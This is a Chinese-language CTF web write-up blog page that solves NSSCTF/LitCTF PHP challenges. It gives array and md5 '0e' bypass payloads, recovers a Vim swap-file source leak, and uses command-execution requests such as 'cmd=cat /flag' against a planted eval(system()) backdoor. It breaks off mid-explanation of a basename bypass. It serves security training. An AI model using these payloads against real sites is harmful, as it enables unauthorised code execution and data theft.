@@ -1,0 +1,999 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="luyanpei">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/07/09/nssctf-web从零开始day3/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web从零开始day3">
+<meta property="og:url" content="http://example.com/2025/07/09/nssctf-web%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bday3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-07-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-10T02:06:32.289Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="train">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/lpp.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/lpp.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/lpp.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            web从零开始day3 | lpp_blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"all_rights_reserved"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/home_banner.jpg","dark":"/images/darkbanner.png"},"title":"祝你开心快乐幸运幸福","subtitle":{"text":["lpp_blog"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/peig0ng/","instagram":null,"zhihu":null,"twitter":null,"email":"2689372361@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/5/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/light.min.css">
+
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/lpp.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                lpp_blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">web从零开始day3</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/lpp.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">luyanpei</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-09</span>
+        <span class="mobile">2025-07-09</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-10 10:06:32</span>
+            <span class="mobile">2025-07-10 10:06:32</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/wp/">wp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/train/">train</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>有三层判断</p>
+<p>第一层</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;])</span><br></pre></td></tr></table></figure></div>
+
+<p>（1）isset($_POST[‘a’]) 检查是否存在名为a的POST参数，有就返回1</p>
+<p>（2）!preg_match(‘&#x2F;[0-9]&#x2F;‘,$_POST[‘a’]) 检查$_POST[‘a’]的值是否含有0-9的数字，有就返回0</p>
+<p>（3）intval($_POST[‘a’]) 将$_POST[‘a’]的值转换为整数，若转换成功就返回转换后的整数<br>（2）（3）说明a里面不可以含有数字</p>
+<p>考虑用数组绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=a</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250709095559626.png"
+                      alt="image-20250709095559626"
+                ></p>
+<p>出现go on说明第一层成功绕过</p>
+<p>第二层</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br></pre></td></tr></table></figure></div>
+
+<p>检测传入b1和b2，并且b1 b2的值不同但是md5相同，也可以用数组去绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1[]=1&amp;b2[]=2</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250709095932960.png"
+                      alt="image-20250709095932960"
+                ></p>
+<p>第二层也绕过</p>
+<p>第三层</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))</span><br></pre></td></tr></table></figure></div>
+
+<p>检测传入c1，c2。判断传入是否为字符串，然后比较md5值是否相等</p>
+<p>利用md5 0e绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1=s878926199a&amp;c2=QNKCDZO</span><br></pre></td></tr></table></figure></div>
+
+<p>md5之后都是0e开头会识别为科学计数法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250709100338750.png"
+                      alt="image-20250709100338750"
+                ></p>
+<h2 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h2><p>提示是vim泄露</p>
+<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>　　以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>　　再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>　　第三次产生的交换文件则为 .index.php.swn</p>
+<p>dirsearch扫一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250709101021721.png"
+                      alt="image-20250709101021721"
+                ></p>
+<p>访问</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28093/.index.php.swp</span><br></pre></td></tr></table></figure></div>
+
+<p>可以把源码下载下来</p>
+<p>使用vim恢复它</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r 文件名</span><br></pre></td></tr></table></figure></div>
+
+<p>恢复出来之后</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;main&gt;</span><br><span class="line">        &lt;div class=&quot;vim&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&amp;pid=TechQna&quot;&gt;&lt;/img&gt;</span><br><span class="line">            &lt;h1 class=&quot;vim_yyds&quot;&gt;</span><br><span class="line">                Vim yyds</span><br><span class="line">            &lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;h3 class=&quot;vim_said&quot;&gt;</span><br><span class="line">            队里师傅说Vim是世界上最好的编辑器，不接受反驳</span><br><span class="line">        &lt;/h3&gt;</span><br><span class="line">        &lt;div class=&quot;can_can_vim&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">            error_reporting(0);</span><br><span class="line">            $password = &quot;Give_Me_Your_Flag&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;</span><br><span class="line">            if ($_POST[&#x27;password&#x27;] === base64_encode($password)) &#123;</span><br><span class="line">                echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;</span><br><span class="line">                eval(system($_POST[&#x27;cmd&#x27;]));</span><br><span class="line">            &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>只要传入password为Give_Me_Your_Flag的base64的值就可以进行命令执行</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=ls</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250709101650462.png"
+                      alt="image-20250709101650462"
+                ></p>
+<p>在根目录找到flag</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><p>源码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;utils.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">    $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">    if ($guess === $secret) &#123;</span><br><span class="line">        $message = &#x27;Congratulations! The flag is: &#x27; . $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $message = &#x27;Wrong. Try Again&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;show_source&#x27;])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>存在几个未见过的东西</p>
+<p>**$_SERVER[‘PHP_SELF’]**这个是你调用的脚本的路径，比如说这个题目它的值就是&#x2F;index.php</p>
+<p>如果你访问的是<a class="link"   target="_blank" rel="noopener" href="http://1.14.71.254:28189/index.php/utils.php%EF%BC%8C%E9%82%A3%E4%B9%88%E5%AE%83%E7%9A%84%E5%80%BC%E5%B0%B1%E4%BC%9A%E6%98%AF/index.php/utils.php" >http://1.14.71.254:28189/index.php/utils.php，那么它的值就会是/index.php/utils.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>$_SERVER[‘REQUEST_URI’]</strong></p>
+<p>它的值这个时候和$_SERVER[‘PHP_SELF’]的值是一样的，</p>
+<p>区别在于，如果你用get传参的时候$_SEVER[‘REQUEST_URL’]是会加上那个参数的，而$_SERVER[‘PHP_SELF’]不会。</p>
+<p><strong>basename</strong></p>
+<p>返回路径中的文件名部分，这个函数有一个可以利用的地方就是，如果传入的参数中出现了非ascii字符则会把它给丢弃。</p>
+<p>然后就是绕过正则</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">　[</span><br><span class="line"></span><br><span class="line">(空格)</span><br><span class="line"></span><br><span class="line">\+ 　</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">这几个字符都会被处理成_(下划线)，也就是可以写/show source/</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个正则是匹配末尾是否有&#x2F;utils.php</p>
+<p>绕过办法很简单</p>
+<p>因为后面要调用basename，所以可以利用中文来绕过，中文不属于ascii编码中的，所以可以payload</p>
